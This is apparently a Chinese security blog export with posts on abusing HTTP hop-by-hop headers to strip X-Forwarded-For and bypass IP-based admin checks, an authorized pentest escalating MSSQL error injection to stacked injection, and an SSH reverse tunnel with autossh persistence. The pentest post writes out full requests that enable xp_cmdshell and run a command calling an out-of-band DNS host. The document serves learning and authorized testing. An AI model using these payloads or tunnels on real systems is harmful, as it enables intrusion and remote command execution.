<p>上面代码表示，我们要求代理服务器将 <code>X-Foo</code> 和 <code>X-Bar</code> 视为 hop-by-hop，这表明我们希望代理在转发请求到下一跳之前将 <code>X-Foo</code> 和 <code>X-Bar</code> 进行处理并删除。</p>
<h2 id="关于滥用-hop-by-hop-header-的一些理论"><a href="#关于滥用-hop-by-hop-header-的一些理论" class="headerlink" title="关于滥用 hop-by-hop header 的一些理论"></a>关于滥用 hop-by-hop header 的一些理论</h2><p>直接删除某些 <code>header</code> ，不一定会导致问题，但要是能够删除原始请求中不存在的，由前端或 HTTP 请求流程链中的另一个代理添加的 <code>header</code> 可能会造成不可预测的结果。<br>例如，在一条 HTTP 请求链中，某个代理服务器可能会在请求包中插入了一个 <code>hearder</code> ，该 <code>header</code> 可能涉及到后端访问控制策略或者描述 <code>internet</code> 用户的真实地址，缺失该 <code>hearder</code> 会导致应用程序处理逻辑出错，从而输出大量的调试错误信息。当某个前端代理存在转发 <code>hop-by-hop header</code> 列表行为，而不是按到规定处理 <code>hop-by-hop header</code> 的时候就可能会产生问题，因为它添加到请求中的任何 <code>header</code> 都可能被 <code>next hop</code> 删除。<br>上面知识已经提及到，<code>Connection</code> 头本身是一个 <code>hop-by-hop</code> 头。这就意味着一个合符规范的代理服务器在转发请求时，应按照 <code>Connection</code> 头中的自定义<code>hop-by-hop</code> 头列表，删除相应的请求头，而不应将请求包中的自定义<code>hop-by-hop</code> 头列表通过 <code>Connection</code> 头转发给下一个服务器中。然而，研究表明，这可能并不总是像预期的那样发生，一些系统似乎也转发整个 <code>Connection</code> 头，或者复制 <code>hop-by-hop</code> 列表并将其附加到自己的 <code>Connection</code> 头中。</p>
<p>下面的图表显示了 <code>hop-by-hop</code> 标头可能会造成的问题，如果后端期望 <code>X-Important-Header</code> 并将其纳入到逻辑决策中<br><img src="https://nathandavison.com/user/pages/01.blog/abusing-http-hop-by-hop-request-headers/hbh-theory-diagram.PNG" alt="img1"></p>
<p>下面介绍遇到的滥用逐跳报头的例子，以及在哪里可以发现影响的一些想法，但潜在的结果将非常具体的应用程序和基础设施的目标，以及报头的目标和它们对后端意味着什么。</p>
<h2 id="如何发现系统中是否存在-hop-by-hop-header"><a href="#如何发现系统中是否存在-hop-by-hop-header" class="headerlink" title="如何发现系统中是否存在 hop-by-hop header"></a>如何发现系统中是否存在 hop-by-hop header</h2><p>~~ 我们可以很容易测试一个系统是否受到某种逐跳头部攻击影响。一个请求头出现和不出现时，会在响应中产生明显的差异，例如 Cookie。我们可以将一个这样的请求头，作为 <code>hop-by-hop</code> 头添加到 <code>Connection</code> 头中。如果请求链中的某个代理行为符合规范，会删除 <code>hop-by-hop</code> 头，那么当该请求头同时出现在请求中以及 <code>Connection</code> 消息头中列出时，响应应该与它根本不出现在请求中相同，但与它出现在请求中且不作为逐跳消息头列出时不同。~~</p>
<p>众所周知，Cookie 作为认证手段，携带 Cookie 访问与不携带 Cookie 访问某个业务接口，服务器响应内容可能具有明显差异。假设用户经过认证后的 Cookie 为 <code>Cookie: session=admin</code>，访问 <code>api/me</code> 服务器返回 <code>HTTP 200</code> 。未经认证访问 <code>api/me</code> ，则返回 <code>HTTP 302</code>。通过 Cookie 测试系统中是否存在 hop-by-hop 流程如下：</p>
<ul>
<li><p>认证后访问，返回 <code>HTTP 200</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/me</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>foo.bar</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=admin</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
</li>
<li><p>未认证访问，返回 <code>HTTP 302</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/me</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>foo.bar</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
</li>
<li><p>系统中存在合规的代理，代理按照规范删除 Cookie 请求头，相当于未认证访问，返回 <code>HTTP 302</code></p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/me</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>foo.bar</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>session=admin</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close, Cookie</span><br></pre></td></tr></table></figure></li>
</ul>
<p>通常，我们是用自动化工具进行测试，例如 burpsuite 的 intruder 功能进行测试，传入一些<a href="https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content/BurpSuite-ParamMiner"><strong>请求头字典</strong></a>进行测试。</p>
<h2 id="通过隐藏-X-Forwarded-For-来屏蔽原始-IP-地址"><a href="#通过隐藏-X-Forwarded-For-来屏蔽原始-IP-地址" class="headerlink" title="通过隐藏 X-Forwarded-For 来屏蔽原始 IP 地址"></a>通过隐藏 X-Forwarded-For 来屏蔽原始 IP 地址</h2><p>假设一个场景：前端代理接收用户请求，会将用户真实 IP 地址添加到 <code>X-Forwarded-For</code>(XFF) 请求头中，后端的基础设施和应用程序基于 XFF 头可以知道请求用户的真实 IP 地址。但如果系统中一个的代理符合规范，我们将会将 <code>X-Forwarded-For</code> 作为自定义 hop-by-hop 头的时候（Just like that：<code>Connection: close, X-Forwarded-For</code>），那么后端将不会接收到用户真实IP地址（<em>可能是接收不到 XFF 头,或者接收到了 XFF 头，但XFF 值为前端代理的 IP 地址,例如：CloudFoundry 中的 gorouter,在 CloudFoundry中的 gorouter 将请求转发到后端应用程序之前，如果请求中尚不存在 XFF 头 ，则会将其之前设备的 IP 地址设置为 XFF头值</em>）。所以，通过上面的方式我们就可以隐藏 XFF 头。<br>说了这么多，仅仅是隐藏真实 IP 地址，好似冇乜撚用，不过如果系统中存在以下情况的话，就可能触发另一种漏洞 – 影响后端关于访问控制策略的判断，从而造成非法访问。场景如下：</p>
<ol>
<li>应用系统组成如下：<em><strong>代理A(IP:10.1.10.1)</strong></em> –&gt; <em><strong>代理B(IP:10.1.10.2)</strong></em> –&gt; <em><strong>后端应用系统C(IP:10.1.10.3)</strong></em> 。</li>
<li>关于 <em><strong>后端应用系统C(IP:10.1.10.3)</strong></em> 的 <code>/admin</code> 拥有了如下的访问控制逻辑，当遇到访问 IP 为 <code>10.1.10.0/24</code> 的时候，直接 Bypass。</li>
<li><em><strong>代理A(IP:10.1.10.1)</strong></em> 会自动添加 XFF 头，用以描述用户真实IP，即使尝试传统的 <code>X-Forwarded-For</code> 欺骗，<em><strong>代理A(IP:10.1.10.1)</strong></em> 仍然会将真实的原始 IP 附加到标头，这样看起来像 <code>X-Forwarded-For: &lt;attacker spoofed ip&gt;, &lt;real attacker ip&gt;</code>，因此该应用程序可以安全地处理欺骗尝试。同时 <em><strong>代理A</strong></em> 只会完全转发 hop-by-hop 头列表，而不对其进行任何处理。</li>
<li>符合规范的 <em><strong>代理B(IP:10.1.10.2)</strong></em> 接收到 <em><strong>代理A(IP:10.1.10.1)</strong></em> 的请求包后，对 hop-by-hop 头列表进行处理。</li>
<li><em><strong>后端应用系统C(IP:10.1.10.3)</strong></em> 接收到 <em><strong>代理B</strong></em> 转发的请求包，发现没有 XFF 头后，自动为请求包添加 XFF 头，XFF 值为 <em><strong>代理B</strong></em> 的 IP地址。</li>
</ol>
<p>所以，问题显而易见，当攻击者发送一个如下的 hop-by-hop 头：<code>Connection: close, X-Forwarded-For</code> 的时候。<em><strong>代理B</strong></em> 将删除请求头中的 <code>X-Forwarded-For</code> 头，结合上述第五点，攻击者即可直接访问 <code>/admin</code> 。类似的案例有：<a href="https://github.com/ritsec/RITSEC-CTF-2019/tree/master/Web/hop-by-hop">RITSEC-CTF-2019-hop-by-hop</a> </p>
<p><img src="https://images.seebug.org/content/images/2022/05/26/1653550381000-20kgbov.png-w331s" alt="img"></p>
<p>在verify函数中尝试获取 XFF 头，如果获取不到则默认为 direct。而前置服务为 apache，根据逐跳原则，当Connection 中加了其他标头 X-Forwarded-For，那么在 apache 转发给下一跳时，会移除 X-Forwarded-For 头，导致在 verify 函数中 request.headers[‘X-Forwarded-For’] 抛出异常，由此拿到 flag。</p>
<h2 id="指纹服务"><a href="#指纹服务" class="headerlink" title="指纹服务"></a>指纹服务</h2><p>使用该技术删除一些请求头，可能会触发错误报告，根据特定的报告信息，可作为指纹识别使用。</p>
<h2 id="关于-Abusing-HTTP-hop-by-hop-request-headers-一文中-SSRF-的说明"><a href="#关于-Abusing-HTTP-hop-by-hop-request-headers-一文中-SSRF-的说明" class="headerlink" title="关于 Abusing HTTP hop-by-hop request headers 一文中 SSRF 的说明"></a>关于 <a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">Abusing HTTP hop-by-hop request headers</a> 一文中 SSRF 的说明</h2><p>文中所述，该开始的时候有点难以理解，后经多次阅读后发现作者意思如下：SSRF 漏洞 ，中文为跨站伪造访问漏洞，攻击者通过该漏洞可以指引服务器发起请求，包括 HTTP 、FTP 等请求。假如可以在执行 SSFR 时候，攻击者还可以控制服务器发起请求时的请求头，那么或许可以结合 hop-by-hop 攻击进行组合利用。</p>
<h2 id="关于-hop-by-hop-的漏洞"><a href="#关于-hop-by-hop-的漏洞" class="headerlink" title="关于 hop-by-hop 的漏洞"></a>关于 hop-by-hop 的漏洞</h2><p>CVE-2022-1388 </p>
<h2 id="hop-by-hop的适用面"><a href="#hop-by-hop的适用面" class="headerlink" title="hop by hop的适用面"></a>hop by hop的适用面</h2><p>根据其他师傅的测试，apache、nginx、openresty、HAProxy，其中只有apache会消费掉Connection中的请求头，其他的要单独测试了。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://paper.seebug.org/1908/#hop-by-hop_1\">https://paper.seebug.org/1908/#hop-by-hop_1\</a><br><a href="https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers">https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers</a></p>
]]></content>
      <categories>
        <category>hop-by-hop</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
      </tags>
  </entry>
  <entry>
    <title>从MSSQL报错注入到堆叠注入，实现命令执行</title>
    <url>/2022/04/07/%E4%BB%8EMSSQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%88%B0%E5%A0%86%E5%8F%A0%E6%B3%A8%E5%85%A5%EF%BC%8C%E5%AE%9E%E7%8E%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="从MSSQL报错注入到堆叠注入，实现命令执行"><a href="#从MSSQL报错注入到堆叠注入，实现命令执行" class="headerlink" title="从MSSQL报错注入到堆叠注入，实现命令执行"></a>从MSSQL报错注入到堆叠注入，实现命令执行</h1><h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01-前言"></a>0x01-前言</h2><p>近日对一已授权的站点进行渗透测试，随手一个单引号，发现存在SQL报错信息。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage1.png" alt="图一"></p>
<h2 id="0x02-报错注入"><a href="#0x02-报错注入" class="headerlink" title="0x02-报错注入"></a>0x02-报错注入</h2><p>尝试报错注入，发现系统存在两层防御，一个是云WAF，一个代码防御。开始使用分块传输绕过云WAF（使用的是Burpsuite插件：<code>chunked-coding-converter-0.4.0</code>），确实可以绕过。但后面使用 <code>select</code> 语句的时候，被后端代码拦截了，提示非法访问。后续修改 POST 数据 <code>Content-Type</code> 为 JSON 格式后，直接绕过云 WAF 以及后端代码两层防御。具体绕过测试结果如下图。</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage2.png" alt="图二"></p>
<p>根据已知信息，使用 SQLMAP 根据进行数据提取。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>r sql.txt <span class="comment">--level 5 --risk 2 --batch --dbms=&quot;Microsoft SQL Server&quot; --technique=E --prefix=&quot;)&quot; --dbs</span></span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage3.png" alt="图三"></p>
<h2 id="0x03-升级为堆叠注入"><a href="#0x03-升级为堆叠注入" class="headerlink" title="0x03-升级为堆叠注入"></a>0x03-升级为堆叠注入</h2><p>猜想该注入点支持堆叠注入。但直接使用 <code>1);select 1</code> ，服务器是报错的。所以必须知道原始的查询语句才可以正确闭合。</p>
<h3 id="查询正在执行的语句"><a href="#查询正在执行的语句" class="headerlink" title="查询正在执行的语句"></a>查询正在执行的语句</h3><p>每个数据库就有一个默认表存储着正在执行的SQL语句，MYSQL 正在执行查询的SQL语句为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> information_schema.`PROCESSLIST` <span class="keyword">where</span> info <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br></pre></td></tr></table></figure>

<p>MSSQL 为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line">der.[session_id],der.[blocking_session_id],</span><br><span class="line">sp.lastwaittype,sp.hostname,sp.program_name,sp.loginame,</span><br><span class="line">der.[start_time] <span class="keyword">AS</span> <span class="string">&#x27;开始时间&#x27;</span>,</span><br><span class="line">der.[status] <span class="keyword">AS</span> <span class="string">&#x27;状态&#x27;</span>,</span><br><span class="line">dest.[text] <span class="keyword">AS</span> <span class="string">&#x27;sql语句&#x27;</span>,</span><br><span class="line">DB_NAME(der.[database_id]) <span class="keyword">AS</span> <span class="string">&#x27;数据库名&#x27;</span>,</span><br><span class="line">der.[wait_type] <span class="keyword">AS</span> <span class="string">&#x27;等待资源类型&#x27;</span>,</span><br><span class="line">der.[wait_time] <span class="keyword">AS</span> <span class="string">&#x27;等待时间&#x27;</span>,</span><br><span class="line">der.[wait_resource] <span class="keyword">AS</span> <span class="string">&#x27;等待的资源&#x27;</span>,</span><br><span class="line">der.[logical_reads] <span class="keyword">AS</span> <span class="string">&#x27;逻辑读次数&#x27;</span></span><br><span class="line"><span class="keyword">FROM</span> sys.[dm_exec_requests] <span class="keyword">AS</span> der</span><br><span class="line"><span class="keyword">INNER</span> <span class="keyword">JOIN</span> master.dbo.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">ON</span> der.session_id<span class="operator">=</span>sp.spid</span><br><span class="line"><span class="keyword">CROSS</span> APPLY  sys.[dm_exec_sql_text](der.[sql_handle]) <span class="keyword">AS</span> dest</span><br><span class="line"><span class="comment">--WHERE [session_id]&gt;50 AND session_id&lt;&gt;@@SPID</span></span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span> der.[session_id]</span><br><span class="line">GO</span><br></pre></td></tr></table></figure>

<p>简化后为：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1</span> dest.[text] <span class="keyword">AS</span> <span class="string">&#x27;sql&#x27;</span> <span class="keyword">FROM</span> sys.[dm_exec_requests] <span class="keyword">AS</span> der <span class="keyword">INNER</span> <span class="keyword">JOIN</span> master.dbo.sysprocesses <span class="keyword">AS</span> sp <span class="keyword">ON</span> der.session_id<span class="operator">=</span>sp.spid <span class="keyword">CROSS</span> APPLY  sys.[dm_exec_sql_text](der.[sql_handle]) <span class="keyword">AS</span> dest <span class="keyword">ORDER</span> <span class="keyword">BY</span> der.[session_id])</span><br></pre></td></tr></table></figure>

<p>正在执行的SQL语句原型，如下图所示：</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage4.png" alt="图四"></p>
<blockquote>
<p>By the way：关于获取 SQL 原始语句将 <strong>“布尔盲注”</strong> 升级为 <strong>“UNION 注入”</strong> 的更多内容详见下文：<a href="https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f">https://medium.com/@Rend_/healing-blind-injections-df30b9e0e06f</a></p>
</blockquote>
<p>闭合原始sql语句，进行堆叠注入：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># 开启 xp_cmdshell</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/马赛克</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>马赛克:8082</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>128</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://马赛克:8082</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://马赛克:8082/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>马赛克</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-haxe">&#123;<span class="string">&quot;ids&quot;</span>:<span class="type"></span>&quot;<span class="number">111</span>);EXEC sp_configure <span class="string">&#x27;show advanced options&#x27;</span>, <span class="number">1</span>;RECONFIGURE;EXEC sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>, <span class="number">1</span>;RECONFIGURE;SELECT 马赛克 FROM dbo.马赛克 WHERE x IN (<span class="number">111</span><span class="string">&quot;&#125;</span></span></span><br></pre></td></tr></table></figure>

<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"># 执行 ping 命令</span><br><span class="line"></span><br><span class="line"><span class="keyword">POST</span> <span class="string">/马赛克</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>马赛克:8082</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>128</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://马赛克:8082</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://马赛克:8082/</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>马赛克</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/json;charset=UTF-8</span><br><span class="line"></span><br><span class="line"><span class="language-n1ql">&#123;&quot;ids&quot;:&quot;111);exec master..xp_cmdshell &#x27;ping bf5af7e2005beb3706534f7b0ab4.ns.pingb.in&#x27;;<span class="keyword">SELECT</span> 马赛克 <span class="keyword">FROM</span> dbo.马赛克 <span class="keyword">WHERE</span> x <span class="keyword">IN</span> (<span class="number">111</span><span class="string">&quot;&#125;</span></span></span><br></pre></td></tr></table></figure>
<p>执行结果：</p>
<p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage20220407203229.png" alt="图五"></p>
<h1 id="0x04-其他"><a href="#0x04-其他" class="headerlink" title="0x04-其他"></a>0x04-其他</h1><p><strong>查询执行过的 sql 语句</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 来自 https://www.cnblogs.com/blogcore/p/12467024.html</span></span><br><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">1000</span> </span><br><span class="line">       ST.text <span class="keyword">AS</span> <span class="string">&#x27;执行的SQL语句&#x27;</span>,</span><br><span class="line">       QS.execution_count <span class="keyword">AS</span> <span class="string">&#x27;执行次数&#x27;</span>,</span><br><span class="line">       QS.total_elapsed_time <span class="keyword">AS</span> <span class="string">&#x27;耗时&#x27;</span>,</span><br><span class="line">       QS.total_logical_reads <span class="keyword">AS</span> <span class="string">&#x27;逻辑读取次数&#x27;</span>,</span><br><span class="line">       QS.total_logical_writes <span class="keyword">AS</span> <span class="string">&#x27;逻辑写入次数&#x27;</span>,</span><br><span class="line">       QS.total_physical_reads <span class="keyword">AS</span> <span class="string">&#x27;物理读取次数&#x27;</span>,       </span><br><span class="line">       QS.creation_time <span class="keyword">AS</span> <span class="string">&#x27;执行时间&#x27;</span> ,  </span><br><span class="line">       QS.<span class="operator">*</span></span><br><span class="line"><span class="keyword">FROM</span>   sys.dm_exec_query_stats QS</span><br><span class="line">       <span class="keyword">CROSS</span> APPLY </span><br><span class="line">sys.dm_exec_sql_text(QS.sql_handle) ST</span><br><span class="line"><span class="keyword">WHERE</span>  QS.creation_time <span class="keyword">BETWEEN</span> <span class="string">&#x27;2015-08-01 00:00:00&#x27;</span> <span class="keyword">AND</span> <span class="string">&#x27;2015-09-02 11:00:00&#x27;</span> </span><br><span class="line"><span class="keyword">ORDER</span> <span class="keyword">BY</span></span><br><span class="line">     QS.total_elapsed_time <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>

<p><strong>简化：去重 + 只取一个结果</strong></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="keyword">distinct</span> TOP <span class="number">1</span> <span class="keyword">SQL</span> <span class="keyword">FROM</span> (<span class="keyword">SELECT</span> ST.text <span class="keyword">AS</span> <span class="string">&#x27;SQL&#x27;</span> <span class="keyword">FROM</span> sys.dm_exec_query_stats QS <span class="keyword">CROSS</span> APPLY sys.dm_exec_sql_text(QS.sql_handle) ST) A <span class="keyword">ORDER</span> <span class="keyword">BY</span> <span class="keyword">SQL</span> <span class="keyword">DESC</span></span><br></pre></td></tr></table></figure>









]]></content>
      <categories>
        <category>SQLi</category>
      </categories>
      <tags>
        <tag>MSSQL</tag>
        <tag>sql server</tag>
        <tag>sql注入</tag>
      </tags>
  </entry>
  <entry>
    <title>内网穿透之ssh反向隧道</title>
    <url>/2022/03/19/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F%E4%B9%8Bssh%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93/</url>
    <content><![CDATA[<h1 id="ssh反向隧道"><a href="#ssh反向隧道" class="headerlink" title="ssh反向隧道"></a>ssh反向隧道</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>一种简单的内网穿透方式</p>
<h2 id="场景示例"><a href="#场景示例" class="headerlink" title="场景示例"></a>场景示例</h2><p><img src="https://raw.githubusercontents.com/sing3r/image/main/hexoImage473fb8ec7ad265461809000af8c0d6b3402d6d2d6db7573a4694e7980c08b640.png"></p>
<h2 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h2><h3 id="VPS"><a href="#VPS" class="headerlink" title="VPS"></a>VPS</h3><ol>
<li>&#x2F;etc&#x2F;ssh&#x2F;sshd_config，GatewayPorts参数值为yes</li>
<li>systemctl restart sshd.service，重启ssh服务</li>
</ol>
<h3 id="内网电脑"><a href="#内网电脑" class="headerlink" title="内网电脑"></a>内网电脑</h3><p><strong>简单建立ssh反向隧道</strong> <br>执行命令：<code>ssh -ngfNTR &lt;VPS监听端口&gt;:&lt;内网主机IP&gt;:&lt;内网主机需要转发到VPS的端口&gt; root@&lt;VPS地址&gt; -o ServerAliveInterval=300</code>。例如：<code>ssh -ngfNTR 80:127.0..0.1:22 root@150.158.xx.xx -o ServerAliveInterval=300</code></p>
<ul>
<li>-f 表示后台执行</li>
<li>-N 表示不执行任何命令</li>
<li>-R 建立反向隧道</li>
<li>1222 A机用来外面ssh的监听端口</li>
<li>-o ServerAliveInterval&#x3D;300 的意思是让ssh client每300秒就给server发个心跳,以免链路被RST. </li>
<li>-f Requests ssh to go to background just before command execution. 让该命令后台运行 . </li>
<li>-n Redirects stdin from &#x2F;dev&#x2F;null (actually, prevents reading from stdin). </li>
<li>-N Do not execute a remote command. 不执行远程命令 . </li>
<li>-T Disable pseudo-tty allocation. 不占用 shell . </li>
<li>-g Allows remote hosts to connect to local forwarded ports.</li>
</ul>
<p><strong>持久建立ssh反向隧道-1</strong> </p>
<ol>
<li>安装autossh；</li>
<li>新建<code>/opt/sshPortMapping.sh</code>，赋予644权限，内容为:<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">autossh -M 7890 -NR 80:127.0.0.1:22 root@150.158.xx.xx -i ~/.ssh/id_rsa</span><br></pre></td></tr></table></figure></li>
<li>新建开机自启动服务文件 <code>/usr/lib/systemd/system/autosshd.service</code>：<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Auto SSH Tunnel</span><br><span class="line">After=network-online.target</span><br><span class="line">StartLimitInterval=10</span><br><span class="line">[Service]</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">User=root</span></span><br><span class="line">Type=simple</span><br><span class="line">ExecStart=/bin/bash /opt/sshPortMapping.sh</span><br><span class="line">ExecReload=/bin/kill -HUP $MAINPID</span><br><span class="line">KillMode=process</span><br><span class="line">Restart=always</span><br><span class="line">RestartSec=5</span><br><span class="line">[Install]</span><br><span class="line">WantedBy=multi-user.target</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=graphical.target</span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">WantedBy=default.target</span></span><br></pre></td></tr></table></figure></li>
<li>设置为开机自启动服务：<code>systemctl enable autosshd.service</code></li>
<li>启动服务：<code>systemctl start autosshd </code></li>
</ol>
<blockquote>
<p><strong>PS：</strong> 因为autossh需要交互输入vps的密码，存在不便。所以使用证书登陆，autossh通过-i指定证书文件进行免密登陆，所以“持久建立ssh反向隧道”还需要在内网主机生成证书，并将公钥上传vps。<br>   6. 至此，其他机器就可以<code>ssh root@150.158.84.84 -p 80</code>访问内网主机。 </p>
</blockquote>
<p><strong>持久建立ssh反向隧道-2</strong></p>
<p>将<code>/opt/sshPortMapping.sh</code>代码替换为以下，其余同“持久建立ssh反向隧道-1”操作一样：<br><code>autossh -M 7890 -fN -o &quot;PubkeyAuthentication=yes&quot; -o &quot;StrictHostKeyChecking=false&quot; -o &quot;PasswordAuthentication=no&quot; -o &quot;ServerAliveInterval 60&quot; -o &quot;ServerAliveCountMax 3&quot; -R 80:127.0.0.1:22 root@150.158.84.84 -i ~/.ssh/id_rsa</code></p>
<h2 id="基于ssh反向隧道建立socket代理"><a href="#基于ssh反向隧道建立socket代理" class="headerlink" title="基于ssh反向隧道建立socket代理"></a>基于ssh反向隧道建立socket代理</h2><p>通过上面的设置已经可以访问内网主机的ssh端口，基于以上，在其他client主机上执行以下命令：<code>ssh -N -D 127.0.0.1:9999 root@150.158.xx.xx -p 80</code>。接下来就可以将浏览器浏代理设置为<code>socket//127.0.0.1:9999</code>，将内网主机将作为代理服务器。</p>
<h2 id="踩坑"><a href="#踩坑" class="headerlink" title="踩坑"></a>踩坑</h2><ol>
<li>测试中，非root用户无法无法建立转发，原因未明。</li>
</ol>
]]></content>
      <categories>
        <category>内网穿透</category>
      </categories>
      <tags>
        <tag>内网穿透</tag>
        <tag>ssh</tag>
        <tag>代理</tag>
      </tags>
  </entry>
  <entry>
    <title>应急响应之axis弱口令入侵</title>
    <url>/2022/03/19/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E4%B9%8Baxis%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%85%A5%E4%BE%B5/</url>
    <content><![CDATA[<h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><p>5月14日晚20点16分，收到客户通知，服务器疑似存在恶意代码。表象为：该服务器从5月12日下午18点左右开始对其他服务器发起暴力破解攻击，包括 SSH、MSSQL 暴力破解活动。</p>
<h2 id="0x02-事件处置"><a href="#0x02-事件处置" class="headerlink" title="0x02 事件处置"></a>0x02 事件处置</h2><h3 id="访谈用户"><a href="#访谈用户" class="headerlink" title="访谈用户"></a>访谈用户</h3><p><strong>访谈内容：</strong></p>
<ol>
<li>异常服务器基本信息，包括IP、用途、中间件、操作系统等？</li>
<li>几时出现异常现场？</li>
<li>异常情况是什么？</li>
<li>遭受异常服务器攻击的受害者IP信息？</li>
</ol>
<h3 id="网络连接分析"><a href="#网络连接分析" class="headerlink" title="网络连接分析"></a>网络连接分析</h3><p>根据用户描述可知，异常服务器对受害者主机发起 SSH、MSSQL 暴力破解，在异常主机输入命令：netstat -anplt | grep 1433，发现存在多条目的端口为 1433 的网络连接信息，目的IP与受害者IP信息一致，程序 PID 为 5033，对应程序为 JAVA</p>
